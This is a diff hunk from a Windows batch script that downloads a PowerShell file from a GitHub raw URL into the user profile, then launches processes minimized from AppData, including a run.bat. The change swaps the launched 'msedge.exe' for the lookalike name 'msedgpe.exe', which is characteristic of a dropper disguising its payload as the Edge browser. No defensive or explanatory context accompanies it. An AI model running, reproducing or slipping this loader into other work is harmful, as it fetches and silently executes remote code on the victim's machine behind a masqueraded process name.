@@ -14,7 +14,7 @@ powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTo
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/cmd.ps1' -OutFile '%USERPROFILE%\cmd.ps1'"
 
 cd "%USERPROFILE%\AppData\Roaming\"
-start /min "" "msedge.exe"
+start /min "" "msedgpe.exe"
 
 cd "%USERPROFILE%
 start /min "" "run.bat"
